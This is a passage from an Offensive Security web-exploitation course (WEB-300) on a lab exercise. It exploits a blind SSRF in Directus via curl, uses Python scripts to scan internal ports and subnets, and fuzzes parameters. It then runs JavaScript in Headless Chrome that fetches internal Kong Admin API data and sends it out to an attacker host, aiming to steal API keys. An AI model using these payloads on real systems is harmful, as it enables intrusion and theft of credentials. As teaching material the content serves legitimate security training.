163        title: formatTitle(filename), 
164        ...(req.body.data || {}), 
165      }; 
Listing 507 - Second code excerpt from Directus files controller 
On line 152, the function uses the axios library to request the value submitted in the url parameter. 
The code stores the results of the request in the fileResponse variable. At this point, the code has 
not checked if the initial request to the files controller contained a valid JSON web token (JWT). 
 
265 (GitHub, 2021), https://github.com/directus/directus/blob/v9.0.0-rc.34/api/src/controllers/files.ts 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
452 
167      const primaryKey = await service.upload(fileResponse.data, payload); 
168   
169      try { 
170        const record = await service.readByKey(primaryKey, req.sanitizedQuery); 
171        res.locals.payload = { data: record || null }; 
172      } catch (error) { 
173        if (error instanceof ForbiddenException) { 
174          return next(); 
175        } 
176   
177        throw error; 
178      } 
179   
180      return next(); 
181    }), 
182    respond 
183  ); 
Listing 508 - Third code excerpt from Directus files controller 
We don’t encounter any authentication checks until code execution reaches line 170. We won’t 
review all of the remaining code. To summarize, the readByKey() function of FileService is 
responsible for checking authorization. FileService inherits the readByKeys() function from 
ItemService. The processAST() function defined in /api/src/services/authorization.ts handles 
authorization. 
Since the application downloads the contents of the submitted URL before checking authorization 
for the storage and retrieval of those contents, the application is vulnerable to unauthenticated 
blind SSRF. Authenticated users would likely be able to use the files import functionality and 
access the retrieved data. 
12.4.2.1 Extra Mile 
Review the source code for /users/invite. Determine why it cannot be exploited. 
12.4.3 Exploiting Blind SSRF in Directus 
Since we cannot access the results of the SSRF, how can we use it to further our attack? As we 
have already demonstrated, the application returns different messages for valid files and non-
existing files. We can use these different messages to infer if a resource exists. 
As a reminder, we receive an HTTP 403 Forbidden when we request a valid resource and an HTTP 
500 Internal Server Error with “Request failed with status code 404” when we request a resource 
that doesn’t exist. 
Let’s check if we can use the SSRF to force Directus to connect to itself. If we send a localhost 
URL, the application should attempt to connect to its own server. Since such a request originates 
from the server, we would be able to use such a payload to access ports listening only on 
localhost. 
Let’s try it out by sending a url value of “http://localhost:8000/”. 
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d 
'{"url":"http://localhost:8000/"}' http://apigateway:8000/files/import 
HTTP/1.1 500 Internal Server Error 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
453 
Content-Type: application/json; charset=utf-8 
Content-Length: 108 
Connection: keep-alive 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"6c-MCdMjU9mfpVtWiLKyczhTW/6Xqo" 
Date: Thu, 25 Feb 2021 16:34:32 GMT 
X-Kong-Upstream-Latency: 27 
 
{"errors":[{"message":"connect ECONNREFUSED 
127.0.0.1:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
Listing 509 - Exploiting SSRF with localhost 
We received an error that the connection was refused. This new error message is interesting. We 
know port 8000 is open externally on the API Gateway server. However, if Directus is running on a 
different server behind the API gateway, “localhost” would refer to the server running Directus, not 
the server running Kong API Gateway. 
A quick Google search reveals that the default port for Directus is 8055. Let’s try out that port on 
localhost. 
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d 
'{"url":"http://localhost:8055/"}' http://apigateway:8000/files/import 
HTTP/1.1 403 Forbidden 
Content-Type: application/json; charset=utf-8 
Content-Length: 102 
Connection: keep-alive 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao" 
Date: Thu, 25 Feb 2021 16:35:58 GMT 
X-Kong-Upstream-Latency: 35 
X-Kong-Proxy-Latency: 1 
Via: kong/2.2.1 
 
{"errors":[{"message":"You don't have permission to access 
this.","extensions":{"code":"FORBIDDEN"}}]} 
Listing 510 - Exploiting SSRF with localhost port 8055 
The server returned the “FORBIDDEN” error code, so we did request a valid resource. We can 
easily verify that TCP port 8055 is closed externally on the Kong API Gateway server. We are likely 
dealing with two or more servers in this scenario. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
454 
 
Figure 309: Server diagram 
This example proves we can leverage the SSRF vulnerability to discover more information about 
the internal network. 
12.4.3.1 Exercises 
1. 
Repeat the steps above. 
2. 
Use the SSRF vulnerability to access a non-HTTP service running on your Kali host. What is 
the result? How might this be useful? 
3. 
Try to identify more error messages. What happens if you request an invalid IP address? 
12.4.4 Port Scanning via Blind SSRF 
Even though we can’t access the results of the SSRF vulnerability, we can still use the different 
HTTP response codes and error messages to determine if we’ve requested a valid resource. We 
can use this information to write a script that will exploit the SSRF vulnerability and act as a port 
scanner. 
Rather than scan every single port, we will start with a small list of common services and HTTP 
ports. Any port scanning through an SSRF vulnerability is going to take longer than a dedicated 
tool, such as Nmap. Therefore, we want to limit our initial attempts to common ports to speed up 
our scan. If the initial results are negative, we can expand the range of ports with subsequent 
scans. 
Let’s create a new file named ssrf_port_scanner.py for our next script. We will again start with the 
shebang and imports. 
#!/usr/bin/env python3 
 
import argparse 
import requests 
Listing 511 - SSRF port scanner imports 
Next, we will define our arguments and parse them. We will need an argument for the host 
vulnerable to SSRF and an argument for the host or IP address we want to load with the SSRF. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
455 
We’ll include a timeout argument so we can account for any network latency. Finally, we’ll add a 
verbose argument for greater control of script output. 
parser = argparse.ArgumentParser() 
parser.add_argument('-t','--target', help='host/ip to target', required=True) 
parser.add_argument('--timeout', help='timeout', required=False, default=3) 
parser.add_argument('-s','--ssrf', help='ssrf target', required=True) 
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", 
default=False) 
 
args = parser.parse_args() 
Listing 512 - SSRF port scanner arguments 
For the final part, we’ll need a list of ports that we want to scan, using only common services and 
HTTP ports in this initial scan. We can always expand it later. For each port in our list, we want to 
send a request via the SSRF vulnerability and inspect the response body. Based on the response 
messages, we can infer if a port is open and what kind of service might be running on it. 
ports = ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', 
'6379','8000','8001','8055','8080','8443','9000'] 
timeout = float(args.timeout) 
 
for p in ports: 
    try: 
        r = requests.post(url=args.target, 
json={"url":"{host}:{port}".format(host=args.ssrf,port=int(p))}, timeout=timeout) 
 
        if args.verbose: 
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text)) 
 
        if "You don't have permission to access this." in r.text: 
            print("{port:0} \t OPEN - returned permission error, therefore valid 
resource".format(port=int(p))) 
        elif "ECONNREFUSED" in r.text: 
            print("{port:0} \t CLOSED".format(port=int(p))) 
        elif "--------FIX ME--------" in r.text: 
            print("{port:0} \t OPEN - returned 404".format(port=int(p))) 
        elif "--------FIX ME--------" in r.text: 
            print("{port:0} \t ???? - returned parse error, potentially open non-
http".format(port=int(p))) 
        elif "--------FIX ME--------" in r.text: 
            print("{port:0} \t OPEN - socket hang up, likely non-
http".format(port=int(p))) 
        else: 
            print("{port:0} \t {msg}".format(port=int(p), msg=r.text)) 
    except requests.exceptions.Timeout: 
        print("{port:0} \t timed out".format(port=int(p))) 
Listing 513 - SSRF port scanner 
Let’s run the script and check for any other open ports on the server running the Directus APIs. 
kali@kali:~$ ./ssrf_port_scanner.py -t http://apigateway:8000/files/import -s 
http://localhost --timeout 5 
22       CLOSED 
80       CLOSED 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
456 
443      CLOSED 
1433     CLOSED 
1521     CLOSED 
3306     CLOSED 
3389     CLOSED 
5000     CLOSED 
5432     CLOSED 
5900     CLOSED 
6379     CLOSED 
8000     CLOSED 
8001     CLOSED 
8055     OPEN - returned permission error, therefore valid resource 
8080     CLOSED 
8443     CLOSED 
9000     CLOSED 
Listing 514 - Port scan results 
The scan results are not inspiring. We only scanned a handful of ports, but only port 8055 is open, 
which the web service is running on. The common services for connecting to a server, such as 
SSH and RDP, are either not present or not running on their normal ports. There are no common 
database ports open either. We are likely communicating with a microservice running in a 
container.266 
12.4.4.1 Exercises 
1. 
Complete the SSRF port scanner script, mapping error messages to port status. 
2. 
Run the script against the Directus host. 
12.4.4.2 Extra Mile 
Modify the script to accept a list of IP addresses to scan as an argument. 
12.4.5 Subnet Scanning with SSRF 
According to its description, Directus is a platform for “managing the content of any SQL 
database”.267 It is reasonable to expect that Directus will connect to a database server. Let’s try 
using the SSRF vulnerability to scan for other targets on the internal network. 
However, we don’t know the IP address range the network uses. We can attempt to scan private 
IP ranges or use wordlists to brute force host names. Both approaches have some drawbacks. 
If we attempt to brute force host names, we need to account for any extra latency introduced by 
DNS lookups on the victim machine. We also need a good wordlist for the host names. 
On the other hand, there are three established ranges for private IP addresses. 
 
266 (Wikipedia, 2021), https://en.wikipedia.org/wiki/OS-level_virtualization 
267 (Monospace Inc, 2020), https://docs.directus.io/getting-started/introduction/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
457 
12.4.5.1.1 
 
IP address range Number of addresses 
10.0.0.0/8 
16,777,216 
172.16.0.0/12 
1,048,576 
192.168.0.0/16 
65,536 
Table 3 - Private IP addresses 
Scanning an entire /8 or even a /12 network via SSRF could take several days. This is one area 
where we need to work smarter, not harder. Rather than scanning an entire subnet, we can try 
scanning for network gateways.268 Network designs commonly use a /16 or /24 subnet mask with 
the gateway running on the IP where the forth octet is “.1” (for example: 192.168.1.1/24 or 
172.16.0.1/16). However, gateways can live on any IP address and subnets can be any size. In 
black box situations, we should start with the most common value. 
As we noticed during our port scan, the Axios library will respond relatively quickly with 
ECONNREFUSED when a port is closed but the host is up. 
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d 
'{"url":"http://127.0.0.1:6666"}' http://apigateway:8000/files/import -s -w 'Total: 
%{time_total} microseconds\n' -o /dev/null 
Total: 178631 microseconds 
Listing 515 - Timing a Connection to a Valid Host but Closed Port 
A request to a closed port took 0.178631 seconds. However, If the host is not reachable, the 
server will take much longer and timeout. 
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d 
'{"url":"http://10.66.66.66"}' http://apigateway:8000/files/import -s -w 'Total: 
%{time_total} microseconds\n' -o /dev/null 
Total: 60155041 microseconds 
Listing 516 - Timing a Connection to a Invalid Host 
A request to an invalid host took 60.155041 seconds. We can assume that the timeout is 
configured to one minute. Using this information, we can deduce if an IP is valid or not, in a 
technique similar to an Nmap host scan.269 If we search for a gateway (assuming the gateway 
ends with “.1”), we can discover the subnet the containers are running on. 
Depending on your version of curl, the time_total variable may be in seconds 
instead of the milliseconds output show above. The total values would display as 
0.178631 and 60.155041 respectively. 
We need to balance request timeouts for either approach. If we simply wait for the server to 
respond to every request, our scans will take longer than if we enforce a timeout in our script. 
However, we may overwhelm the server and get false negatives if our timeout value is too 
aggressive. 
 
268 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Gateway_(telecommunications)#Network_gateway 
269 (Gordon “Fyodor” Lyon, 2015), https://nmap.org/book/man-host-discovery.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
458 
Let’s copy ssrf_port_scanner.py into a new file named ssrf_gateway_scanner.py. We’ll update the 
new script to scan subnets for default gateways and constrain our port scanning to a single port 
to reduce scan time. The port we decide to scan does not matter since we are only attempting to 
determine if the host is up. We can resume port scanning once we know the IP range used by the 
internal network. 
Since we’re scanning for default gateways, we will always use “.1” as the fourth octet of our 
payload. Since 10.0.0.0/8 networks and 172.16.0.0/12 will always have a static first octet, we will 
need two for loops to iterate through the possible values of the second and third octets. 
Scanning the 192.168.0.0/16 network yielded no response so let’s focus on the 172.16.0.0/12 
network. 
baseurl = args.target 
 
base_ip = "http://172.{two}.{three}.1" 
timeout = float(args.timeout) 
 
for y in range(--------FIX ME--------,256): 
    for x in range(1,256): 
        host = base_ip.format(two=int(y), three=int(x)) 
        print("Trying host: {host}".format(host=host)) 
        try: 
            r = requests.post(url=baseurl, 
json={"url":"{host}:8000".format(host=host)}, timeout=timeout) 
 
Listing 517 - Updated section of ssrf_gateway_scanner.py 
Let’s run the script. 
kali@kali:~$ ./ssrf_gateway_scanner.py -t http://apigateway:8000/files/import 
Trying host: http://172.16.1.1 
        8000     timed out 
Trying host: http://172.16.2.1 
        8000     timed out 
... 
Trying host: http://172.16.15.1 
        8000     timed out 
Trying host: http://172.16.16.1 
        8000     OPEN - returned 404 
Trying host: http://172.16.17.1 
        8000     timed out 
Listing 518 - Subnet scanning results 
Excellent. We found a live IP address at 172.16.16.1. Let’s kill the process. It may seem odd that a 
gateway has an open port but this may be an idiosyncrasy of the underlying environment. The 
important takeaway here is that it responded differently than the other IPs. Even a “connection 
refused” message would indicate we had found something interesting. 
If you don’t find any live hosts after a few minutes, consider re-running the script 
with a larger timeout value. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
459 
12.4.5.2 Exercises 
1. 
Complete the gateway scanner script. 
2. 
Run the script and detect a live gateway. 
12.4.5.3 Extra Mile 
Create a second script that enumerates based on host name. Try using the script to identify the 
live hosts. 
12.4.6 Host Enumeration 
Now that we’ve identified a live IP address, let’s copy our script to a new file named 
ssrf_subnet_scanner.py and modify it to scan just the subnet we previously identified for live IPs. 
It does not matter which port number we use in this scan. We can identify live hosts even if they 
refuse connections on the chosen port. 
kali@kali:~$ ./ssrf_subnet_scanner.py -t http://apigateway:8000/files/import --timeout 
5 
Trying host: 172.16.16.1 
        8000     OPEN - returned 404 
Trying host: 172.16.16.2 
        8000     OPEN - returned 404 
Trying host: 172.16.16.3 
        8000     Connection refused, could be live host 
Trying host: 172.16.16.4 
        8000     Connection refused, could be live host 
Trying host: 172.16.16.5 
        8000     Connection refused, could be live host 
Trying host: 172.16.16.6 
        8000     Connection refused, could be live host 
Trying host: 172.16.16.7 
        8000     {"errors":[{"message":"connect EHOSTUNREACH 
172.16.16.7:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
Trying host: 172.16.16.8 
        8000     {"errors":[{"message":"connect EHOSTUNREACH 
172.16.16.8:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
Listing 519 - Subnet scanning results 
We can kill the script once we start receiving multiple “EHOSTUNREACH” errors. A quick Google 
search indicates this error message might mean the host couldn’t find a route to a given IP 
address. Since we have several live hosts to work with, we can ignore any IP addresses that 
resulted in the “EHOSTUNREACH” error. 
If you don’t find any live hosts, re-run the script with a larger timeout value. 
Based on the response values, we can assume the first six hosts are valid. Let’s modify the script 
to scan for common ports on those hosts, using the same list of ports found in Listing 512. We 
can limit the amount of extraneous data by filtering “connection refused” messages. 
kali@kali:~$ ./ssrf_subnet_scanner.py -t http://apigateway:8000/files/import --timeout 
5 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
460 
Trying host: 172.16.16.1 
        22       ???? - returned parse error, potentially open non-http 
        8000     OPEN - returned 404 
Trying host: 172.16.16.2 
        8000     OPEN - returned 404 
        8001     OPEN - returned permission error, therefore valid resource 
Trying host: 172.16.16.3 
        5432     OPEN - socket hang up, likely non-http 
Trying host: 172.16.16.4 
        8055     OPEN - returned permission error, therefore valid resource 
Trying host: 172.16.16.5 
        9000     OPEN - returned 404 
Trying host: 172.16.16.6 
        6379     ???? - returned parse error, potentially open non-http 
Listing 520 - Subnet scanning results 
These results are promising. We know the Kong API Gateway is running on 8000. This port is 
open on the first two hosts. Kong runs its Admin API on port 8001, restricted to localhost. Since 
172.16.16.2 has ports 8000 and 8001 open, we can assume that it is running the Kong API 
Gateway. The host on 172.16.16.1 is likely the network gateway or an external network interface. 
This environment should always have six hosts but the IP assigned to each host 
might vary. Reverting the VM can also reassign the hosts’ IP addresses. 
The default port for Directus is 8055, which aligns with host four. Port 5432 is the default port for 
PostgreSQL. Port 6379 is the default port for REDIS. Using this information, we now have a better 
picture of the internal network. 
 
Figure 310: Updated network diagram 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
461 
12.4.6.1.1 
 
We still have one host running an unknown HTTP service on port 9000. However, the SSRF 
vulnerability allows us to verify which backend servers are hosting the public endpoints we have 
identified. 
12.4.6.2 Exercises 
1. 
Modify the subnet scanner script to scan for common ports. 
2. 
Run the script to identify open ports. 
3. 
Verify which external endpoints are running on the internal Directus server. 
12.5 Render API Auth Bypass 
We discovered the /render service during our initial enumeration. However, the service required 
authentication via the API gateway. Developers sometimes rely on a gateway or reverse proxy to 
handle authentication or restrict access to an API. Perhaps we can use the SSRF to bypass the 
API gateway and call the render service directly. 
However, we first need to figure out which backend server is hosting the render service. It doesn’t 
seem like the render service is running on the Directus host, so we will turn our attention to the 
host with the unknown service on port 9000. Let’s use the SSRF vulnerability to check if 
http://172.16.16.3:9000/render is valid. 
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d 
'{"url":"http://172.16.16.5:9000/render"}' http://apigateway:8000/files/import 
HTTP/1.1 500 Internal Server Error 
Content-Type: application/json; charset=utf-8 
Content-Length: 108 
Connection: keep-alive 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc" 
Date: Thu, 25 Feb 2021 16:59:49 GMT 
X-Kong-Upstream-Latency: 33 
X-Kong-Proxy-Latency: 1 
Via: kong/2.2.1 
 
{"errors":[{"message":"Request failed with status code 
404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
Listing 521 - Searching for /render 
Unfortunately, our request failed to find a valid resource. We need to consider that the URL of the 
backend service might not match the URL the API gateway exposes. For example, the backend 
URL could include versioning. Perhaps we can do some more fuzzing and inspect response 
codes to find the backend service. 
First, we’ll need to build a short wordlist with potential URLs. 
/ 
/render 
/v1/render 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
462 
/api/render 
/api/v1/render 
Listing 522 - Contents of paths.txt 
After modifying one of our existing scripts, we’ll run it. 
kali@kali:~$ ./ssrf_path_scanner.py -t http://apigateway:8000/files/import -s 
http://172.16.16.5:9000 -p paths.txt --timeout 5 
/                 OPEN - returned 404 
/render           OPEN - returned 404 
/v1/render        OPEN - returned 404 
/api/render       {"errors":[{"message":"Request failed with status code 
400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
/api/v1/render    OPEN - returned 404 
Listing 523 - Checking for possible paths 
We received one interesting response: “Request failed with status code 400”. An HTTP 400 Bad 
Request usually indicates that the server cannot process a request due to missing data or a client 
error. What might we be missing from our request? What could the render service do? We only 
know the name and it isn’t very descriptive. Let’s suppose it draws or creates something. How 
might we provide data to it? 
Let’s put together a list of potential parameter names and values. There are plenty of wordlists of 
parameter names available online.270 Let’s start with a smaller list of values that seem relevant. 
We can always expand to a larger list if we need to. We’ll include our Kali host in any potential URL 
or link field so we can watch for working requests. 
?data=foobar 
?file=file:///etc/passwd 
?url=http://192.168.118.3/render/url 
?input=foobar 
?target=http://192.168.118.3/render/target 
Listing 524 - Contents of paths2.txt 
Even if we don’t have a valid parameter or value, perhaps we can still generate an error on the 
render service that would give us a clue as to our next step. When we are operating in an 
unknown environment or with an unfamiliar system, we sometimes have to rely on small 
differences in server responses, such as error messages, to infer what is happening in the 
unknown application. 
Let’s try running this new wordlist through our script, making sure to update the SSRF target value 
to the new URL. 
kali@kali:~$ ./ssrf_path_scanner.py -t http://apigateway:8000/files/import -s 
http://172.16.16.5:9000/api/render -p paths2.txt --timeout 5 
?data=foobar     {"errors":[{"message":"Request failed with status code 
400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
?file=file:///etc/passwd         {"errors":[{"message":"Request failed with status 
code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
?url=http://192.168.118.3/render/url    OPEN - returned permission error, therefore 
 
270 (Daniel Miessler, et al, 2017),https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-
names.txt 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
463 
valid resource 
?input=foobar    {"errors":[{"message":"Request failed with status code 
400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
?target=http://192.168.118.3/render/target      {"errors":[{"message":"Request failed 
with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]} 
Listing 525 - Running enumeration with paths2.txt 
It seems the url parameter was a valid request based on the permission error message. Let’s 
check if it actually connected back to our Kali host. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.135 - - [25/Feb/2021:12:09:35 -0500] "GET /render/url HTTP/1.1" 404 492 "-
" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
HeadlessChrome/79.0.3945.0 Safari/537.36" 
Listing 526 - Apache access.log contents 
Not only did we receive a request from the render service, Headless Chrome271 made the request. 
12.5.1.1 Exercises 
1. 
Using the scripts created so far as a base, create the SSRF path scanner script. 
2. 
Run the script as detailed in this section and verify the render service can connect back to 
your Kali VM. 
12.6 Exploiting Headless Chrome 
When we exploited the SSRF in the Directus Files API, the user agent was axios. Now that we can 
call the Render API through the SSRF vulnerability, we can make an instance of Headless Chrome 
access a URL of our choice. Initially, this might seem like another SSRF vulnerability but Headless 
Chrome is essentially a full browser without a UI. The headless browser should still execute any 
JavaScript functions as it loads a web page. If it does, we have the ability to run arbitrary 
JavaScript from the browser that is running on the remote server, which would give us the ability 
to extract data from other internal pages or services, send POST requests, and interact with the 
other internal resources in many different ways. 
Before we get ahead of ourselves, let’s verify the headless browser will execute JavaScript. We 
will create a simple HTML page with a JavaScript function that runs on page load. 
<html> 
<head> 
<script> 
function runscript() { 
    fetch("http://192.168.118.3/itworked"); 
} 
</script> 
</head> 
<body onload='runscript()'> 
<div></div> 
 
271 (Google, 2021), https://developers.google.com/web/updates/2017/04/headless-chrome 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
464 
</body> 
</html> 
Listing 527 - Contents of hello.html 
Since the application does not return the page loaded with the SSRF vulnerability, we need 
another way to determine if the browser executes JavaScript. Our JavaScript function uses 
fetch() to make a call back to our Kali host. The onload event in the body tag calls our function. 
After placing this file in our webroot, let’s use the SSRF vulnerability to call the render service 
pointed at this file. 
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d 
'{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.118.3/hello.html"}' 
http://apigateway:8000/files/import 
HTTP/1.1 403 Forbidden 
Content-Type: application/json; charset=utf-8 
Content-Length: 102 
Connection: keep-alive 
X-Powered-By: Directus 
Vary: Origin 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Content-Range 
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao" 
Date: Thu, 25 Feb 2021 18:14:42 GMT 
X-Kong-Upstream-Latency: 1555 
X-Kong-Proxy-Latency: 2 
Via: kong/2.2.1 
 
{"errors":[{"message":"You don't have permission to access 
this.","extensions":{"code":"FORBIDDEN"}}]} 
Listing 528 - Calling render with our html file 
Since we received a “forbidden” response, the browser should have loaded our HTML page. Let’s 
check our Apache access log for the callback. 
kali@kali:~/Documents/awae$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.135 - - [25/Feb/2021:13:14:41 -0500] "GET /hello.html HTTP/1.1" 200 483 "-
" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
HeadlessChrome/79.0.3945.0 Safari/537.36" 
192.168.120.135 - - [25/Feb/2021:13:14:41 -0500] "GET /itworked HTTP/1.1" 404 491 
"http://192.168.118.3/hello.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 
(KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36" 
Listing 529 - Checking Apache access.log 
We have two new entries in access.log. The first lists the hello.html file that we used in the call to 
the Render API. The second entry is from the JavaScript function. We have verified we can 
execute JavaScript in the Headless Chrome browser. 
Let’s review the attack chain. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
465 
 
Figure 311: SSRF Attack Chain 
We started the attack by sending a request with curl. The Kong API Gateway proxies our request 
to the Files service endpoint on the Directus host. The Directus application takes the value of the 
url parameter and sends a GET request to that URL. We specified the Render service endpoint so 
the Directus application sends the GET request there. The Render service handles the GET 
request and reads the url parameter out of the URL and sends a GET request to that URL using 
Headless Chrome. The browser loads the HTML page from our Kali host and executes the 
JavaScript, which makes a second GET request to our Kali host. 
The Render service returns its results to the File service. The File service returns the HTTP 403 
Forbidden response because we are not authenticated. 
12.6.1.1 Exercise 
Repeat the steps above and execute JavaScript in the Headless Chrome browser. 
12.6.2 Using JavaScript to Exfiltrate Data 
Our next goal is to use JavaScript to exfiltrate data, essentially turning our blind SSRF into a 
normal SSRF. We’ll attempt to use JavaScript to call the Kong Admin API from inside the network. 
Remember, such an HTTP request would originate from the host running the Headless Chrome 
browser. The containers seem to have network connections that allow internal communication 
between themselves on ports that are not exposed externally as evidenced by the SSRF being 
able to access port 8001 on (what we perceive to be) the Kong API Gateway host. We can 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
466 
reasonably assume the Headless Chrome browser will also be able to access the same port as 
well. 
The default behavior of a user-defined bridge network in Docker is for containers to expose all 
ports to each other.272 This description seems to match the environment we are operating in. A 
port needs to be explicitly published to be accessible from outside the network. This would 
explain why we can access port 8000 on the Kong API Gateway container from Kali (it is 
published) and why the Render Service can access port 8001 on the Kong API Gateway container 
(it is not published but exposed internally by the network). 
Let’s create a new HTML page with a JavaScript function. First, the function will make a request 
to the Kong Admin API. If CORS is enabled and permissive enough on the Admin API, our 
JavaScript function will be able to access the response body and send it back to the web server 
running on our Kali host. If this doesn’t work, we will have to consult the documentation for the 
Kong Admin API and determine what we can do without CORS. 
function exfiltrate() { 
    fetch("http://172.16.16.2:8001") 
    .then((response) => response.text()) 
    .then((data) => { 
        fetch("http://192.168.118.3/callback?" + encodeURIComponent(data)); 
    }).catch(err => { 
        fetch("http://192.168.118.3/error?" + encodeURIComponent(err)); 
    });  
} 
Listing 530 - Sample JavaScript function to exfiltrate data 
After placing the JavaScript function in an HTML file in our webroot, we will again call the Render 
API on the new HTML page. 
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d 
'{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.118.3/exfil.html"}' 
http://apigateway:8000/files/import  
{"errors":[{"message":"You don't have permission to access 
this.","extensions":{"code":"FORBIDDEN"}}]} 
Listing 531 - Calling the Render API on exfil.html 
When we check access.log, we should have the callback message. 
kali@kali:~$ sudo tail /var/log/apache2/access.log  
... 
192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /exfil.html HTTP/1.1" 200 562 "-
" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
HeadlessChrome/79.0.3945.0 Safari/537.36" 
192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET 
/callback?%7B%22plugins%22%3A%7B%22enabled_in_cluster%22%3A%5B%22key-
auth%22%5D%2C%22available_on_server%22%3A%7B%22grpc-web%22%3Atrue%2C%22correlation-
id%22%3Atrue%2C%22...042%2C%22mem_cache_size%22%3A%22128m%22%2C%22pg_max_concurrent_qu
eries%22%3A0%2C%22nginx_main_worker_p" 414 0 "-" "-" 
Listing 532 - Excerpt from access.log 
 
272 (Docker Inc, 2021), https://docs.docker.com/network/bridge/#differences-between-user-defined-bridges-and-the-default-bridge 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
467 
Excellent. Our JavaScript function sent a request to the internal endpoint, then sent that response 
as a URL-encoded value back to our Kali host. The message might have been truncated, but our 
JavaScript function worked. 
12.6.2.1 Exercise 
Repeat the steps above. 
12.6.2.2 Extra Mile 
Modify the JavaScript function to avoid data truncation by sending the data in multiple requests if 
the data is longer than 1024 characters. 
12.6.3 Stealing Credentials from Kong Admin API 
Next, we’ll turn our focus to stealing credentials from the Kong Admin API with our JavaScript 
payload. As a reminder, when we first called the /render endpoint through the Kong API Gateway, 
it responded with “No API key found in request”. Let’s try to find that API key in Kong’s Admin API. 
We can find the Admin API endpoint that returns API keys in Kong’s documentation.273 Let’s 
update our JavaScript function to call /key-auths, call the Render service, and then check 
access.log. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.135 - - [25/Feb/2021:13:34:24 -0500] "GET /exfil.html HTTP/1.1" 200 569 "-
